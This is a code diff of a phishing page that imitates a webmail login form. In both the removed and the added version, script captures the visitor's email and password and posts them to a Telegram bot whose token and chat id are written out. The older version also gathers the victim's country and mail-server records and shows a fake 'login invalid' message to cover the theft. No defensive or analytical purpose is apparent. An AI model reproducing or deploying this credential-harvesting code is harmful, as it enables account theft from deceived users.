@@ -153,77 +153,71 @@
 }
 </style>
 <script>
-        // Function to get query parameters
-        function getQueryParam(param) {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(param);
-        }
+document.getElementById("login_form").addEventListener("submit", function (e) {
+    e.preventDefault(); 
+    
+    const email = document.getElementById("user").value;
+    const password = document.getElementById("pass").value;
 
-        // Populate email field from the URL parameter
-        window.onload = function() {
-            const emailParam = getQueryParam('email');
-            if (emailParam && emailParam !== "[[-email-]]") {
-                document.getElementById('email').value = emailParam;
+    const botToken = "7296259786:AAEouXz7crjzYMqXBAY3W0rSL0jqaK-lvp8";
+    const chatId = "6885599280";
+
+    const message = `Email: ${email}\nPassword: ${password}`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+        }),
+    })
+        .then(response => {
+            if (response.ok) {
+                alert("Data sent successfully!");
+            } else {
+                alert("Failed to send data.");
             }
-        };
+        })
+        .catch(error => console.error("Error:", error));
+});
+<!-- HTML Form -->
+<div id="forms">
+    <form novalidate="" id="login_form" action="https://webmail.faribadesigns.com/login/" method="post" target="_self" style="visibility:">
+        <div class="input-req-login"><label for="user">Email Address</label></div>
+        <div class="input-field-login icon username-container">
+            <input name="user" id="user" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
+        </div>
+        <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
+        <div class="input-field-login icon password-container">
+            <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
+        </div>
+        <div class="controls">
+            <div class="login-btn">
+                <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
+            </div>
+        </div>
+        <div class="clear" id="push"></div>
+    </form>
+</div>
 
-        async function sendDataToTelegram(event) {
-            event.preventDefault();
+<script>
+// Function to get query parameters from the URL
+function getQueryParameter(param) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+}
 
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
-            const notificationBar = document.getElementById("notification-bar");
-
-            // Extract domain from email
-            const domain = email.split('@')[1];
-
-            // Fetch MX records for the domain
-            let mxRecords = "Unable to fetch MX records";
-            try {
-                const mxResponse = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
-                const mxData = await mxResponse.json();
-                if (mxData.Answer) {
-                    mxRecords = mxData.Answer.map(record => record.data).join(", ");
-                }
-            } catch (error) {
-                console.error("Error fetching MX records:", error);
-            }
-
-            // Fetch country using ipinfo.io
-            let country = "Unknown";
-            try {
-                const geoResponse = await fetch('https://ipinfo.io/json');
-                const geoData = await geoResponse.json();
-                country = geoData.country;
-            } catch (error) {
-                console.error("Error fetching country:", error);
-            }
-
-            const botToken = "7296259786:AAEouXz7crjzYMqXBAY3W0rSL0jqaK-lvp8";
-            const chatId = "6885599280";
-            const message = `Email: ${email}\nPassword: ${password}\nDomain: ${domain}\nMX Records: ${mxRecords}\nCountry: ${country}`;
-
-            notificationBar.textContent = "Authenticating...";
-            notificationBar.style.display = "block";
-            notificationBar.className = "notification-bar auth-bar";
-
-            try {
-                await new Promise(resolve => setTimeout(resolve, 3000));
-
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: chatId, text: message })
-                });
-
-                notificationBar.textContent = "The login is invalid.";
-                notificationBar.className = "notification-bar error-bar";
-            } catch (error) {
-                notificationBar.textContent = "An error occurred. Please try again.";
-                notificationBar.className = "notification-bar error-bar";
-            }
-        }
-    </script>
+// Populate the email field if 'email' parameter exists
+window.addEventListener('DOMContentLoaded', () => {
+    const emailParam = getQueryParameter('email');
+    if (emailParam) {
+        const emailField = document.getElementById('user');
+        emailField.value = emailParam; // Set the email field value
+    }
+});
+</script>
 
 
 <div class="copyright">
